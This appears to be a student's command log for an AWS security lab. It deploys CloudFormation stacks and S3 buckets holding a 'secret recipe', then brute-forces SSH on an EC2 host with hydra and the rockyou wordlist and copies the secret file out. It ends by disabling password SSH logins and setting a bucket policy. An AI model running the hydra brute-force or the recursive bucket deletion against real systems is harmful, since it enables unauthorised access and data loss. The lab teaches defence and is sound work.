aws cloudformation create-stack --region us-east-1 --stack-name c3-s3 --template-body file://c3-s3.yml
aws cloudformation create-stack --region us-east-1 --stack-name c3-vpc --template-body file://c3-vpc.yml
aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=ec2 --capabilities CAPABILITY_IAM
aws cloudformation update-stack --region us-east-1 --stack-name c3-app --template-body file://c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=ec2 --capabilities CAPABILITY_IAM
aws cloudformation update-stack --region us-east-1 --stack-name c3-s3 --template-body file://c3-s3.yml
# aws cloudformation delete-stack --region us-east-1 --stack-name c3-app
# aws s3 rm s3://cand-c3-secret-recipes-376940003530 --recursive
# aws s3api delete-bucket --bucket cand-c3-secret-recipes-376940003530

aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-376940003530/ --region us-east-1
aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-376940003530/ --region us-east-1

http://c1-web-service-alb-1708067091.us-east-1.elb.amazonaws.com/free_recipe

ssh -i "ec2.pem" ubuntu@ec2-3-239-193-147.compute-1.amazonaws.com
date
hydra -l ubuntu -P rockyou.txt ssh://ec2-44-206-86-43.compute-1.amazonaws.com
aws s3 ls s3://cand-c3-secret-recipes-376940003530 --region us-east-1
aws s3 cp s3://cand-c3-secret-recipes-376940003530/secret_recipe.txt  .  --region us-east-1
cat secret_recipe.txt

ssh -i "ec2.pem" ubuntu@ec2-44-206-86-43.compute-1.amazonaws.com
sudo vi /etc/ssh/sshd_config
# Find this line:
PasswordAuthentication yes
# change it to:
PasswordAuthentication no
# save and exit
#restart SSH server
sudo service ssh restart

{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::cand-c3-free-recipes-376940003530",
            "Effect": "Allow"
        }
    ]
}